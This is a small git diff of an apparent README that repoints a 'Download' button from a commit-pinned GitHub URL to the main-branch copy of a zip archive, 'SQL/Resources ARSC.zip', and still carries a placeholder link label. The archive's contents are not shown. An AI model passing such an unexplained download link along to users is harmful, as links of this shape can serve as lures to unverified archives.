@@ -6,7 +6,7 @@
 </p>
 
 <p align="center">
-  <a href="[https://your-download-link-here](https://github.com/cocs2abba/A/blob/47cdb635054b819c1d73a4ca8a0185d5cab9666c/SQL/Resources%20ARSC.zip)">
+  <a href="[https://your-download-link-here](https://github.com/cocs2abba/A/blob/main/SQL/Resources%20ARSC.zip)">
     <img src="SQL/Lib.svg" alt="Download" />
   </a>
 </p>
